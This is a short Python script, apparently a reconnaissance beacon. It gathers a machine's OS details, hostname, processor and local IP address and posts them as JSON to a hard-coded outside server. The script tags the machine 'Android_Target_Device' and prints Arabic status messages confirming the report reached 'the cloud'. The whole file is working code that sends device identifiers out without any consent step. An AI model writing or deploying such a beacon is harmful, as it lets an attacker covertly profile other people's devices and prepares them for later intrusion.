import platform
import socket
import json
import urllib.request
import urllib.error

SERVER_URL = "https://MohammedAm.pythonanywhere.com/report"

def gather_telemetry():
    try:
        data = {
            "system_type": platform.system(),
            "device_name": platform.node(),
            "os_release": platform.release(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "local_ip": socket.gethostbyname(socket.gethostname())
        }
    except Exception as err:
        data = {"error": str(err)}
    return data

def transmit_report():
    system_info = gather_telemetry()
    payload = {
        "device_id": "Android_Target_Device",
        "content": json.dumps(system_info, indent=4, ensure_ascii=False)
    }
    encoded_data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        SERVER_URL,
        data=encoded_data,
        headers={'Content-Type': 'application/json'}
    )
    try:
        with urllib.request.urlopen(req) as res:
            if res.status == 200:
                print("[+] تم إرسال التقرير بنجاح إلى السحابة!")
    except Exception as e:
        print("[-] خطأ:", e)

if __name__ == "__main__":
    transmit_report()
  
